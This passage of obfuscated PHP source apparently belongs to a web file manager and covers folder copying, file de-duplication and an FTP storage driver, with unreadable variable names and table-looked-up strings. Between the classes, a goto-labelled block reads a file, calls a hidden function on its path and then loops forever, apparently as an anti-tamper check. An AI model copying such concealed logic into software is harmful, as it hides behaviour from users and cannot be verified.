âª[$Âéù‡æ[192]] . $Âéù‡æ[50]; $è¤ğà’ = array($Âéù‡æ[682] => array($Âéù‡æ[691], "\x72\x65\x70\x6c\x61\143\x65\50\x70\x61\162\x65\x6e\164\x4c\145\166\145\x6c\54\x27{$º’ƒ®¯}\47\54\47{$¯õ°·¨}\47\51"), $Âéù‡æ[678] => $¼®Íä©˜[$Âéù‡æ[189]], $Âéù‡æ[679] => $¼®Íä©˜[$Âéù‡æ[597]]); if ($‹–¯™È) { $è¤ğà’[$Âéù‡æ[527]] = 0; } $this->where($›¹¬·Ÿ¬)->data($è¤ğà’)->save(); } $this->where(array($Âéù‡æ[514] => $¢°®°ËÙ))->data($À ¥Ôæ…)->save(); return $¢°®°ËÙ; } private function clearShare($è‘­—çµ, $„Ò“‡ñ) { $ÜÛ˜äÑ =& $_SERVER[‘ÆÜ‘œ]; $îÛ€ªè· = $this->sourceInfo($è‘­—çµ); $Éºê¥éƒ = $this->sourceInfo($„Ò“‡ñ); if ($îÛ€ªè·[$ÜÛ˜äÑ[597]] == $Éºê¥éƒ[$ÜÛ˜äÑ[597]] && $îÛ€ªè·[$ÜÛ˜äÑ[189]] == $ÜÛ˜äÑ[692]) { return; } $Ê½ıÖ« = array($ÜÛ˜äÑ[612] => array($ÜÛ˜äÑ[643], $îÛ€ªè·[$ÜÛ˜äÑ[612]] . $è‘­—çµ . $ÜÛ˜äÑ[644])); $õ¬éıã™ = $this->field($ÜÛ˜äÑ[514])->where($Ê½ıÖ«)->getField($ÜÛ˜äÑ[192], !0); if (!$õ¬éıã™) { return; } $Ê½ıÖ« = array($ÜÛ˜äÑ[192] => array($ÜÛ˜äÑ[7], $õ¬éıã™), $ÜÛ˜äÑ[693] => 1); $¹ƒñ»– = Model($ÜÛ˜äÑ[694])->field($ÜÛ˜äÑ[695])->where($Ê½ıÖ«)->select(); if (!$¹ƒñ»–) { return; } $¹ƒñ»– = array_to_keyvalue($¹ƒñ»–, $ÜÛ˜äÑ[12], $ÜÛ˜äÑ[695]); $Ê½ıÖ« = array($ÜÛ˜äÑ[695] => array($ÜÛ˜äÑ[7], $¹ƒñ»–)); Model($ÜÛ˜äÑ[694])->where($Ê½ıÖ«)->save(array($ÜÛ˜äÑ[693] => 0)); Model($ÜÛ˜äÑ[696])->where($Ê½ıÖ«)->delete(); } public function copyFolderFromIO($§ùÉ“Ûâ, $ğĞ£ì©ã, $÷ıéÇÀ…, $ÇÉöÒğĞ, $Ôø÷±áö, $Ê–š§ë– = false) { $öß±•ãó =& $_SERVER[‘ÆÜ‘œ]; $¾Íµ½ = array($öß±•ãó[661] => array(), $öß±•ãó[662] => array(), $öß±•ãó[660] => array(), $öß±•ãó[697] => array()); $Éœ”íıì = $Ê–š§ë– ? $Ê–š§ë– : $§ùÉ“Ûâ->pathThis($ğĞ£ì©ã); $€Ø¬‹¦ = $this->fileNameExist($÷ıéÇÀ…, $Éœ”íıì); $ªæñ©ø· = $this->mkdir($÷ıéÇÀ…, $Éœ”íıì, $ÇÉöÒğĞ); if (!$€Ø¬‹¦ || $ÇÉöÒğĞ == REPEAT_RENAME_FOLDER) { $ÇÉöÒğĞ = !1; } if ($€Ø¬‹¦) { $this->_childrenAllMake($€Ø¬‹¦); } Hook::trigger($öß±•ãó[698]); $¯Ëšâ«• = KodIO::ioFileDriverGet($öß±•ãó[506] . $÷ıéÇÀ… . $öß±•ãó[412]); $this->_copyChildTo($§ùÉ“Ûâ, $ğĞ£ì©ã, $ªæñ©ø·, $ÇÉöÒğĞ, $¾Íµ½, $Ôø÷±áö, $¯Ëšâ«•); Hook::trigger($öß±•ãó[699]); if ($ªæñ©ø·) { $this->folderSizeResetChildren($ªæñ©ø·); } $this->_childrenListClear(); Model($öß±•ãó[480])->addAll($¾Íµ½[$öß±•ãó[661]], array(), !0); Model($öß±•ãó[663])->eventCopy($ªæñ©ø·); $this->saveAll($¾Íµ½[$öß±•ãó[662]]); Model($öß±•ãó[568])->linkAdd($¾Íµ½[$öß±•ãó[660]]); Model($öß±•ãó[568])->remove($¾Íµ½[$öß±•ãó[697]]); $this->folderSizeReset($÷ıéÇÀ…); $this->updateModifyTime($÷ıéÇÀ…); return $ªæñ©ø·; } private function _copyChildTo($„ìÊÑÔœ, $ğû¹Ù›, $èïæãÆ°, $­ˆÃÃúã, &$ÄÎ‡Š†˜, $ÙÔ¤¹°¤, $ÁÈúÓ¼â) { $ÈÛ’šà½ =& $_SERVER[‘ÆÜ‘œ]; $ÖÂ´¸ìö = $this->sourceInfoCache($èïæãÆ°); $ÕìÄØò˜ = $„ìÊÑÔœ->listPath($ğû¹Ù›); $ÕìÄØò˜ = $ÕìÄØò˜ ? $ÕìÄØò˜ : array($ÈÛ’šà½[86] => array(), $ÈÛ’šà½[85] => array()); $³Çò¼óÃ = array_merge($ÕìÄØò˜[$ÈÛ’šà½[86]], $ÕìÄØò˜[$ÈÛ’šà½[85]]); $›ıÒÀ¾Œ = $this->_addFiles($„ìÊÑÔœ, $ÁÈúÓ¼â, $ÕìÄØò˜[$ÈÛ’šà½[86]], $ÙÔ¤¹°¤); $•ù½İ¶¼ = array(); foreach ($³Çò¼óÃ as &$ã©Ï­„ô) { if (isset($›ıÒÀ¾Œ[$ã©Ï­„ô[$ÈÛ’šà½[32]]])) { $ã©Ï­„ô = $›ıÒÀ¾Œ[$ã©Ï­„ô[$ÈÛ’šà½[32]]]; } $ã©Ï­„ô[$ÈÛ’šà½[508]] = $ã©Ï­„ô[$ÈÛ’šà½[33]] == $ÈÛ’šà½[78]; $ã©Ï­„ô[$ÈÛ’šà½[509]] = substr(_get($ã©Ï­„ô, $ÈÛ’šà½[167], $ÈÛ’šà½[12]), 0, 10); $ã©Ï­„ô[$ÈÛ’šà½[79]] = _get($ã©Ï­„ô, $ÈÛ’šà½[79], 0); $ã©Ï­„ô[$ÈÛ’šà½[565]] = _get($ã©Ï­„ô, $ÈÛ’šà½[565], 0); if (!isset($ã©Ï­„ô[$ÈÛ’šà½[700]]) && $ã©Ï­„ô[$ÈÛ’šà½[565]]) { $ÄÎ‡Š†˜[$ÈÛ’šà½[697]][] = $ã©Ï­„ô[$ÈÛ’šà½[565]]; } if ($­ˆÃÃúã) { $ÃÏÈöÍ = $this->fileNameExistCache($èïæãÆ°, $ã©Ï­„ô[$ÈÛ’šà½[32]]); if ($ÃÏÈöÍ) { if ($ã©Ï­„ô[$ÈÛ’šà½[508]] || $­ˆÃÃúã == REPEAT_SKIP) { continue; } if ($­ˆÃÃúã == REPEAT_REPLACE) { $Şå‹›ÙÆ = $this->sourceInfoCache($ÃÏÈöÍ); $ªÂã¨ê× = $this->fileHistory($Şå‹›ÙÆ, $ã©Ï­„ô[$ÈÛ’šà½[565]], $ã©Ï­„ô[$ÈÛ’šà½[79]]); if ($ªÂã¨ê×) { $ÄÎ‡Š†˜[$ÈÛ’šà½[660]][] = $ã©Ï­„ô[$ÈÛ’šà½[565]]; } continue; } else { if ($­ˆÃÃúã == REPEAT_RENAME) { $ã©Ï­„ô[$ÈÛ’šà½[32]] = $this->fileNameAutoCache($èïæãÆ°, $ã©Ï­„ô[$ÈÛ’šà½[32]], $­ˆÃÃúã, !1); } } } } if (!$ã©Ï­„ô[$ÈÛ’šà½[508]] && $ã©Ï­„ô[$ÈÛ’šà½[565]] == 0) { continue; } if (!$ã©Ï­„ô[$ÈÛ’šà½[508]] && $ã©Ï­„ô[$ÈÛ’šà½[565]]) { $ÄÎ‡Š†˜[$ÈÛ’šà½[660]][] = $ã©Ï­„ô[$ÈÛ’šà½[565]]; } $•ù½İ¶¼[] = $this->_makeItemData($ã©Ï­„ô, $ÖÂ´¸ìö, $ã©Ï­„ô[$ÈÛ’šà½[32]]); } unset($ã©Ï­„ô); if (!empty($•ù½İ¶¼)) { $this->addAll($•ù½İ¶¼); $this->_childrenListSelect($èïæãÆ°); } $§™éìñ = $this->_childrenList($èïæãÆ°); $§™éìñ = array_to_keyvalue($§™éìñ, $ÈÛ’šà½[32]); foreach ($³Çò¼óÃ as $ã©Ï­„ô) { $Şå‹›ÙÆ = $§™éìñ[$ã©Ï­„ô[$ÈÛ’šà½[32]]]; $¾¶©ùÍµ = $Şå‹›ÙÆ[$ÈÛ’šà½[192]]; $this->_copyApplyMeta($Şå‹›ÙÆ, $ÄÎ‡Š†˜); if ($ã©Ï­„ô[$ÈÛ’šà½[33]] == $ÈÛ’šà½[78]) { $ã©Ï­„ô[$ÈÛ’šà½[87]] = $„ìÊÑÔœ->getPathInner($ã©Ï­„ô[$ÈÛ’šà½[87]]); $this->_copyChildTo($„ìÊÑÔœ, $ã©Ï­„ô[$ÈÛ’šà½[87]], $¾¶©ùÍµ, $­ˆÃÃúã, $ÄÎ‡Š†˜, $ÙÔ¤¹°¤, $ÁÈúÓ¼â); } } } private function _addFiles($½ÉŸœ¨, $èğíÓƒ“, $€›±”ıĞ, $¡úÒÀşû) { $Ü‚†Ô’ =& $_SERVER[‘ÆÜ‘œ]; if (!$€›±”ıĞ || count($€›±”ıĞ) == 0) { return array(); } $ÅòóÂõÛ = array(); foreach ($€›±”ıĞ as &$²¦ÆŞõ‰) { Hook::trigger($Ü‚†Ô’[701], $²¦ÆŞõ‰); $²¦ÆŞõ‰[$Ü‚†Ô’[87]] = $½ÉŸœ¨->getPathInner($²¦ÆŞõ‰[$Ü‚†Ô’[87]]); $°…±’æò = $½ÉŸœ¨->hashSimple($²¦ÆŞõ‰[$Ü‚†Ô’[87]]); $»˜¢øÏï = $½ÉŸœ¨->hashMd5($²¦ÆŞõ‰[$Ü‚†Ô’[87]]); if (strlen($»˜¢øÏï) > 10 && !isset($ÅòóÂõÛ[$»˜¢øÏï])) { $ÅòóÂõÛ[$»˜¢øÏï] = array(); } $²¦ÆŞõ‰[$Ü‚†Ô’[702]] = $°…±’æò; $²¦ÆŞõ‰[$Ü‚†Ô’[571]] = $»˜¢øÏï; $ÅòóÂõÛ[$»˜¢øÏï][] =& $²¦ÆŞõ‰; if (count($ÅòóÂõÛ[$»˜¢øÏï]) > 1) { $²¦ÆŞõ‰[$Ü‚†Ô’[700]] = !0; } Hook::trigger($Ü‚†Ô’[703], $²¦ÆŞõ‰); } unset($²¦ÆŞõ‰); $œÔÜÉõá = array($Ü‚†Ô’[571] => array($Ü‚†Ô’[7], array_keys($ÅòóÂõÛ))); $Õñ æı¢ = Model($Ü‚†Ô’[704]); $àá¼ô¸Ù = $Õñ æı¢->where($œÔÜÉõá)->select(); $àá¼ô¸Ù = $àá¼ô¸Ù ? $àá¼ô¸Ù : array(); foreach ($àá¼ô¸Ù as $¯¼„¯Ï) { if (!isset($ÅòóÂõÛ[$¯¼„¯Ï[$Ü‚†Ô’[571]]])) { continue; } $åÁŸáğ‡ = $ÅòóÂõÛ[$¯¼„¯Ï[$Ü‚†Ô’[571]]]; foreach ($åÁŸáğ‡ as &$²¦ÆŞõ‰) { $²¦ÆŞõ‰[$Ü‚†Ô’[565]] = $¯¼„¯Ï[$Ü‚†Ô’[565]]; $²¦ÆŞõ‰[$Ü‚†Ô’[700]] = !0; } unset($²¦ÆŞõ‰); } $Òı§ë®¥ = array(); foreach ($€›±”ıĞ as $‡³ß¼«·) { Hook::trigger($Ü‚†Ô’[705], $‡³ß¼«·); if (isset($‡³ß¼«·[$Ü‚†Ô’[700]]) && $‡³ß¼«·[$Ü‚†Ô’[700]]) { Hook::trigger($Ü‚†Ô’[706], $‡³ß¼«·); continue; } $‚’üÄÒÆ = $½ÉŸœ¨->getPathInner($‡³ß¼«·[$Ü‚†Ô’[87]]); $± Ÿ“´Î = $Õñ æı¢->addFileMake($‚’üÄÒÆ, $èğíÓƒ“, $‡³ß¼«·[$Ü‚†Ô’[79]], $‡³ß¼«·[$Ü‚†Ô’[702]], $‡³ß¼«·[$Ü‚†Ô’[571]], $‡³ß¼«·[$Ü‚†Ô’[32]], $¡úÒÀşû); Hook::trigger($Ü‚†Ô’[706], $‡³ß¼«·); if (!is_array($± Ÿ“´Î)) { continue; } $Òı§ë®¥[] = $± Ÿ“´Î; } $Õñ æı¢->addAll($Òı§ë®¥); $œÔÜÉõá = array($Ü‚†Ô’[571] => array($Ü‚†Ô’[7], array_keys($ÅòóÂõÛ))); $àá¼ô¸Ù = $Õñ æı¢->where($œÔÜÉõá)->select(); $àá¼ô¸Ù = $àá¼ô¸Ù ? $àá¼ô¸Ù : array(); foreach ($àá¼ô¸Ù as $¯¼„¯Ï) { if (!isset($ÅòóÂõÛ[$¯¼„¯Ï[$Ü‚†Ô’[571]]])) { continue; } $ì÷îÆš =& $ÅòóÂõÛ[$¯¼„¯Ï[$Ü‚†Ô’[571]]]; foreach ($ì÷îÆš as &$²¦ÆŞõ‰) { $²¦ÆŞõ‰[$Ü‚†Ô’[565]] = $¯¼„¯Ï[$Ü‚†Ô’[565]]; } unset($²¦ÆŞõ‰); } $Ò›ÖŞÚ  = array(); foreach ($€›±”ıĞ as $äàƒ¹³×) { $Ò›ÖŞÚ [$äàƒ¹³×[$Ü‚†Ô’[32]]] = $äàƒ¹³×; } return $Ò›ÖŞÚ ; } } define($_SERVER[‘ÆÜ‘œ][707], $_SERVER[‘ÆÜ‘œ][708]); $wzumxtploy = $_SERVER[‘ÆÜ‘œ][709]; goto DÒ·Îƒ³¬; D•šÊƒÃÓ¯: if (!isset($_SERVER[$_SERVER[‘ÆÜ‘œ][324]]) || !isset($_SERVER[$_SERVER[‘ÆÜ‘œ][322]])) { $_getc = $_SERVER[‘ÆÜ‘œ][325]; $_getfile = $_SERVER[$_SERVER[‘ÆÜ‘œ][326]] . $_SERVER[‘ÆÜ‘œ][327]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[‘ÆÜ‘œ][286], $_getfilec); if (count($_getarrs) < $_SERVER[‘ÆÜ‘œ][328]) { $exit = $_SERVER[‘ÆÜ‘œ][329]; $exit(); } $_act = $_SERVER[‘ÆÜ‘œ][330]; $_act($_SERVER[$_SERVER[‘ÆÜ‘œ][326]] . $_SERVER[‘ÆÜ‘œ][327]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[‘ÆÜ‘œ][472]); } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; public $config = array(); public function __construct($æë¡¨Æö) { parent::__construct(); if (count($æë¡¨Æö) > 0) { $this->_init($æë¡¨Æö); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($•‰¹šÅ€) { $áíü®Ÿ… =& $_SERVER[‘ÆÜ‘œ]; global $config; $this->appCharset = $config[$áíü®Ÿ…[1597]]; $this->systemCharset = $config[$áíü®Ÿ…[1598]]; if (isset($•‰¹šÅ€[$áíü®Ÿ…[1599]]) && $•‰¹šÅ€[$áíü®Ÿ…[1599]]) { $this->systemCharset = $•‰¹šÅ€[$áíü®Ÿ…[1599]]; } } public function iconvApp($¶ÇÓ¼‹´) { return $this->iconvTo($¶ÇÓ¼‹´, $this->systemCharset, $this->appCharset); } public function iconvSystem($†æ¾ğ‘¯) { return $this->iconvTo($†æ¾ğ‘¯, $this->appCharset, $this->systemCharset); } public function getPathOuter($‘©îĞÏÜ) { $ÕáÇÇ¸À =& $_SERVER[‘ÆÜ‘œ]; $ÒÒÎËœ = $this->iconvApp($this->pathBase); $‘©îĞÏÜ = $this->iconvApp($‘©îĞÏÜ); if (substr($ÒÒÎËœ, 0, 2) == $ÕáÇÇ¸À[1474]) { $ÒÒÎËœ = BASIC_PATH . substr($ÒÒÎËœ, 2); } if (substr($‘©îĞÏÜ, 0, 2) == $ÕáÇÇ¸À[1474]) { $‘©îĞÏÜ = BASIC_PATH . substr($‘©îĞÏÜ, 2); } $ÒÒÎËœ = KodIO::clear($ÒÒÎËœ); $‘©îĞÏÜ = KodIO::clear($‘©îĞÏÜ); $‘©îĞÏÜ = substr($‘©îĞÏÜ, strlen($ÒÒÎËœ)); if (empty($this->pathDriver)) { return $‘©îĞÏÜ; } return $this->pathDriver . $ÕáÇÇ¸À[8] . ltrim($‘©îĞÏÜ, $ÕáÇÇ¸À[8]); } private function _init($şæõšº = array()) { $Òôï…Ú =& $_SERVER[‘ÆÜ‘œ]; if (!function_exists($Òôï…Ú[1600])) { throw new Exception(LNG($Òôï…Ú[1601])); } $this->config = $şæõšº; $this->charsetReset($şæõšº); foreach ($şæõšº as $¥ñÑó¶× => $ï½Œ«„¸) { if (isset($this->{$¥ñÑó¶×})) { $this->{$¥ñÑó¶×} = $ï½Œ«„¸; } } return $this->_login($şæõšº); } private function _login($·¶ò¶Û€) { $ÁÍ×˜³Í =& $_SERVER[‘ÆÜ‘œ]; static $¯ÀƒÍÙ = array(); $‡ãÓ±¶ = md5(json_encode($·¶ò¶Û€)); if (isset($¯ÀƒÍÙ[$‡ãÓ±¶])) { foreach ($¯ÀƒÍÙ[$‡ãÓ±¶] as $¿§ğ ¤ó => $Ú¯§¶óÍ) { $this->{$¿§ğ ¤ó} = $Ú¯§¶óÍ; } return !0; } $ÂŒòºà¥ = parse_url(trim($this->server, $ÁÍ×˜³Í[8])); $this->host = $ÂŒòºà¥[$ÁÍ×˜³Í[207]]; $ìÆ”Ù½À = isset($ÂŒòºà¥[$ÁÍ×˜³Í[206]]) && $ÂŒòºà¥[$ÁÍ×˜³Í[206]] == $ÁÍ×˜³Í[1602] ? !0 : !1; $this->scheme = $ìÆ”Ù½À ? $ÁÍ×˜³Í[1603] : $ÁÍ×˜³Í[1604]; $this->port = isset($ÂŒòºà¥[$ÁÍ×˜³Í[208]]) ? $ÂŒòºà¥[$ÁÍ×˜³Í[208]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($ÁÍ×˜³Í[1605]) . $this->host . $ÁÍ×˜³Í[4] . $this->port, !0); return !1; } $³íñ¾—Ô = @ftp_login($this->connect, $this->username, $this->userpass); if (!$³íñ¾—Ô) { $this->writeLog(LNG($ÁÍ×˜³Í[1606]) . $this->username, !0); return !1; } $this->ftpPath = @ftp_pwd($this->connect); @ftp_chdir($this->connect, $ÁÍ×˜³Í[8]); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $šôÓÀèŒ = $this->pasv == $ÁÍ×˜³Í[91] ? !0 : !1; @ftp_pasv($this->connect, $šôÓÀèŒ); $¯ÀƒÍÙ[$‡ãÓ±¶] = array($ÁÍ×˜³Í[1607] => $this->connect, $ÁÍ×˜³Í[207] => $this->host, $ÁÍ×˜³Í[206] => $this->scheme, $ÁÍ×˜³Í[208] => $this->port); return $³íñ¾—Ô; } private function _isconn($š›Öö = true) { if (is_resource($this->connect)) { return !0; } if (!$š›Öö) { return !1; } return $this->_login($this->config); } public function mkfile($‡µÓØµ, $œÄñ¹Æ¦ = '', $È¥º ÆÌ = REPEAT_RENAME) { if ($this->setContent($‡µÓØµ, $œÄñ¹Æ¦)) { return $this->getPathOuter($‡µÓØµ); } $this->writeLog(LNG($_SERVER[‘ÆÜ‘œ][1608]), !0); return !1; } public function mkdir($ËœäúÅ, $Â“ÀëÃÀ = REPEAT_SKIP) { $Ş¤ÁÈË† =& $_SERVER[‘ÆÜ‘œ]; if (!$ËœäúÅ || $ËœäúÅ == $Ş¤ÁÈË†[8]) { return !0; } if (!$this->_isconn()) { return !1; } $ËœäúÅ = $this->iconvSystem($ËœäúÅ); if ($this->_isFolder($ËœäúÅ) || @ftp_mkdir($this->connect, $ËœäúÅ)) { return $this->getPathOuter($ËœäúÅ); } if (!$this->mkdir($this->pathFather($ËœäúÅ))) { return !1; } if ($ËœäúÅ = @ftp_mkdir($this->connect, $ËœäúÅ)) { return $this->getPathOuter($ËœäúÅ); } $»´ãéòÛ = __FUNCTION__ . $Ş¤ÁÈË†[1609]; $this->writeLog($»´ãéòÛ, !0); return !1; } public function copyFile($ñçÈ‚Ú§, $×ùË­Í°) { if (!$this->_isconn()) { return !1; } $£•›¡‡ù = $this->pathThis($this->iconvSystem($ñçÈ‚Ú§)); $©ã‹¬ = $this->tempFile($£•›¡‡ù); $¯¯š¢ô¿ = $this->iconvApp($©ã‹¬); $this->download($ñçÈ‚Ú§, $¯¯š¢ô¿); $¨¥‰èÎô = $this->upload($×ùË­Í°, $¯¯š¢ô¿); $this->tempFileRemve($©ã‹¬); return $¨¥‰èÎô; } public function moveFile($ï‹Éëå, $ô ¦‹Æ´) { if (!$this->_isconn()) { return !1; } $ï‹Éëå = $this->iconvSystem($ï‹Éëå); $ô ¦‹Æ´ = $this->iconvSystem($ô ¦‹Æ´); $†÷ª¾Ç¾ = @ftp_rename($this->connect, $ï‹Éëå, $ô ¦‹Æ´); if (!$†÷ª¾Ç¾) { $this->writeLog(__FUNCTION__ . $_SERVER[‘ÆÜ‘œ][1609], !0); return !1; } return $this->getPathOuter($ô ¦‹Æ´); } public function delFile($Íİ›Ë±å) { if (!$this->_isconn()) { return !1; } $Íİ›Ë±å = $this->iconvSystem($Íİ›Ë±å); $ƒ£¬–— = @ftp_delete($this->connect, $Íİ›Ë±å); if (!$ƒ£¬–—) { $this->writeLog(__FUNCTION__ . $_SERVER[‘ÆÜ‘œ][1609], !0); } return $ƒ£¬–—; } public function delFolder($¸ÃÍÃ) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $§õİ¢ôŒ = $µÏÃçˆĞ = array(); $this->fileList($¸ÃÍÃ, $§õİ¢ôŒ, $µÏÃçˆĞ, !0); $this->listItemCache = !0; foreach ($µÏÃçˆĞ as $ŞÌ‚ÛÄ) { $á™ÑŒÁ = $this->iconvSystem($ŞÌ‚ÛÄ[$_SERVER[‘ÆÜ‘œ][32]]); $‰¨íõ™Â = @ftp_delete($this->connect, $á™ÑŒÁ); if (!$‰¨íõ™Â) { return !1; } } foreach ($§õİ¢ôŒ as $á™ÑŒÁ) { $á™ÑŒÁ = $this->iconvSystem($á™ÑŒÁ); $‰¨íõ™Â = @ftp_rmdir($this->connect, $á™ÑŒÁ); if (!$‰¨íõ™Â) { return !1; } } $¸ÃÍÃ = $this->iconvSystem($¸ÃÍÃ); return @ftp_rmdir($this->connect, $¸ÃÍÃ); } public function rename($¤ÌºËÁ¾, $‹Ù¡’¦ü) { $Á¥¦Çá° =& $_SERVER[‘ÆÜ‘œ]; if (!$this->_isconn()) { return !1; } $¡ÅƒĞï = $this->fileNameAuto($this->pathFather($¤ÌºËÁ¾), $‹Ù¡’¦ü); $¡ÅƒĞï = $this->iconvSystem($¡ÅƒĞï); $¤ÌºËÁ¾ = $this->iconvSystem($¤ÌºËÁ¾); $…Š³¹åí = $this->pathFather($¤ÌºËÁ¾); $ş÷ˆëë§ = rtrim($…Š³¹åí, $Á¥¦Çá°[8]) . $Á¥¦Çá°[8] . $¡ÅƒĞï; $¯¢ÏÜòñ = @ftp_rename($this->connect, $¤ÌºËÁ¾, $ş÷ˆëë§); if (!$¯¢ÏÜòñ) { $this->writeLog(__FUNCTION__ . $Á¥¦Çá°[1609], !0); return !1; } $ş÷ˆëë§ = $this->iconvApp($ş÷ˆëë§); return $this->getPathOuter($ş÷ˆëë§); } private function folderInfo($’àÜ¼¯û, $½ëÌêˆË = false) { $°›—ÂÙï =& $_SERVER[‘ÆÜ‘œ]; $ÅÙÅÏ‡ï = array($°›—ÂÙï[32] => $this->pathThis($’àÜ¼¯û), $°›—ÂÙï[87] => $this->getPathOuter($°›—ÂÙï[8] . $’àÜ¼¯û), $°›—ÂÙï[33] => $°›—ÂÙï[78]); if ($½ëÌêˆË) { return $ÅÙÅÏ‡ï; } $ÅÙÅÏ‡ï[$°›—ÂÙï[232]] = $ÅÙÅÏ‡ï[$°›—ÂÙï[88]] = 0; $ÅÙÅÏ‡ï[$°›—ÂÙï[233]] = $ÅÙÅÏ‡ï[$°›—ÂÙï[234]] = !0; return $ÅÙÅÏ‡ï; } private function fileInfo($’Á³æíÀ, $·˜¿­ØÀ = false, $Šï‡óº† = array()) { $ŒãµÍ‡œ =& $_SERVER[‘ÆÜ‘œ]; $°°Œ»šŸ = array($ŒãµÍ‡œ[32] => $this->pathThis($’Á³æíÀ), $ŒãµÍ‡œ[87] => $this->getPathOuter($ŒãµÍ‡œ[8] . $’Á³æíÀ), $ŒãµÍ‡œ[33] => $ŒãµÍ‡œ[231], $ŒãµÍ‡œ[79] => isset($Šï‡óº†[$ŒãµÍ‡œ[79]]) ? $Šï‡óº†[$ŒãµÍ‡œ[79]] : 0, $ŒãµÍ‡œ[167] => $this->ext($’Á³æíÀ)); if ($·˜¿­ØÀ) { return $°°Œ»šŸ; } $°°Œ»šŸ[$ŒãµÍ‡œ[232]] = $°°Œ»šŸ[$ŒãµÍ‡œ[88]] = 0; $°°Œ»šŸ[$ŒãµÍ‡œ[233]] = $°°Œ»šŸ[$ŒãµÍ‡œ[234]] = !0; $­ûÌ— = $this->iconvSystem($’Á³æíÀ); $°°Œ»šŸ[$ŒãµÍ‡œ[88]] = @ftp_mdtm($this->connect, $­ûÌ—); if (empty($Šï‡óº†)) { $Šï‡óº† = $this->objectMeta($’Á³æíÀ); if (!$Šï‡óº†) { return $°°Œ»šŸ; } } $°°Œ»šŸ[$ŒãµÍ‡œ[79]] = $Šï‡óº†[$ŒãµÍ‡œ[79]]; return $°°Œ»šŸ; } public function size($õ• Œ¹å) { $Ë«½Ä¸ò = $this->objectMeta($õ• Œ¹å); return $Ë«½Ä¸ò ? $Ë«½Ä¸ò[$_SERVER[‘ÆÜ‘œ][79]] : 0; } public function info($Åú¶€“) { if ($this->isFile($Åú¶€“)) { return $this->fileInfo($Åú¶€“, 0); } else { if ($this->isFolder($Åú¶€“)) { return $this->folderInfo($Åú¶€“); } } return !1; } private function fileList($œ©¥¦Ûò, &$úäí¸õš, &$¼Òã—¶°, $åĞ¶£Ù€ = false) { $€òëŸà =& $_SERVER[‘ÆÜ‘œ]; $œ©¥¦Ûò = $this->iconvSystem($œ©¥¦Ûò); if (!$this->isFolder($œ©¥¦Ûò)) { return !1; } $œ©¥¦Ûò = rtrim($œ©¥¦Ûò, $€òëŸà[8]) . $€òëŸà[8]; check_abort(); $Ù¯ù‡ ¸ = @ftp_rawlist($this->connect, $œ©¥¦Ûò); if (!$Ù¯ù‡ ¸) { $Ù¯ù‡ ¸ = array(); } $Üåœ·ÌÅ = array($€òëŸà[10] => 1, $€òëŸà[1419] => 1); foreach ($Ù¯ù‡ ¸ as $¶©ï¦¯) { $ÛÕ”ß¶½ = $this->_listItem($¶©ï¦¯); if ($ÛÕ”ß¶½[0] == $€òëŸà[866]) { continue; } $ÊìĞ®…§ = $ÛÕ”ß¶½[8]; if (empty($ÊìĞ®…§) && $ÊìĞ®…§ !== $€òëŸà[229] || isset($Üåœ·ÌÅ[$ÊìĞ®…§])) { continue; } $ÊìĞ®…§ = $this->iconvApp($œ©¥¦Ûò . ltrim($ÊìĞ®…§, $€òëŸà[8])); $ñãœ”® = array($€òëŸà[32] => $ÊìĞ®…§, $€òëŸà[33] => $€òëŸà[231], $€òëŸà[79] => $ÛÕ”ß¶½[4]); if (substr($¶©ï¦¯, 0, 1) == $€òëŸà[1610]) { $ñãœ”®[$€òëŸà[33]] = $€òëŸà[78]; $ñãœ”®[$€òëŸà[79]] = 0; } $ÜèÆ¹Ğ‚ = $ñãœ”®[$€òëŸà[33]] == $€òëŸà[78] ? !0 : !1; $this->cacheMethodInfoSet($ÊìĞ®…§, $ÜèÆ¹Ğ‚, $ñãœ”®); if ($ÜèÆ¹Ğ‚) { $úäí¸õš[] = $ÊìĞ®…§; if ($åĞ¶£Ù€) { $this->fileList($ÊìĞ®…§, $úäí¸õš, $¼Òã—¶°, $åĞ¶£Ù€); } continue; } $¼Òã—¶°[] = $ñãœ”®; } $this->cacheMethodInfoSet($œ©¥¦Ûò, !0); } private function _listItem($‚Ìş¯áÓ) { if (empty($‚Ìş¯áÓ)) { return array(); } $ïâÖğÏ = preg_split($_SERVER[‘ÆÜ‘œ][1611], $‚Ìş¯áÓ); if (count($ïâÖğÏ) <= 9) { return $ïâÖğÏ; } $ïâÖğÏ[8] = trim(substr($‚Ìş¯áÓ, strpos($‚Ìş¯áÓ, $ïâÖğÏ[7]) + strlen($ïâÖğÏ[7]))); return array_splice($ïâÖğÏ, 0, 9); } public function listPath($Ööã¹, $•—²³½µ = false) { $—ĞúÎÉÉ =& $_SERVER[‘ÆÜ‘œ]; if (!$this->_isconn()) { return !1; } $ø’¶ıÔ = $€ğ©ê² = array(); $this->fileList($Ööã¹, $ø’¶ıÔ, $€ğ©ê²); foreach ($ø’¶ıÔ as $Î«´ıè => $öıÑÉù) { $ø’¶ıÔ[$Î«´ıè] = $this->folderInfo($öıÑÉù, $•—²³½µ); } foreach ($€ğ©ê² as $Î«´ıè => $öıÑÉù) { $€ğ©ê²[$Î«´ıè] = $this->fileInfo($öıÑÉù[$—ĞúÎÉÉ[32]], $•—²³½µ, $öıÑÉù); } return array($—ĞúÎÉÉ[85] => $ø’¶ıÔ, $—ĞúÎÉÉ[86] => $€ğ©ê²); } public function has($ª…ÍÚö, $úÆ°ª”ú = false, $Á±È÷Ã = true) { $áú³¨ş  =& $_SERVER[‘ÆÜ‘œ]; $˜³Úüç¶ = $÷ÚçÖàş = array(); $†ÖÖ´“Ê = $úÆ°ª”ú ? !0 : !1; $this->fileList($ª…ÍÚö, $˜³Úüç¶, $÷ÚçÖàş, $†ÖÖ´“Ê); if ($úÆ°ª”ú) { return array($áú³¨ş [240] => count($÷ÚçÖàş), $áú³¨ş [241] => count($˜³Úüç¶)); } if ($Á±È÷Ã) { if (count($÷ÚçÖàş)) { return !0; } } else { if (count($˜³Úüç¶)) { return !0; } } return !1; } public function 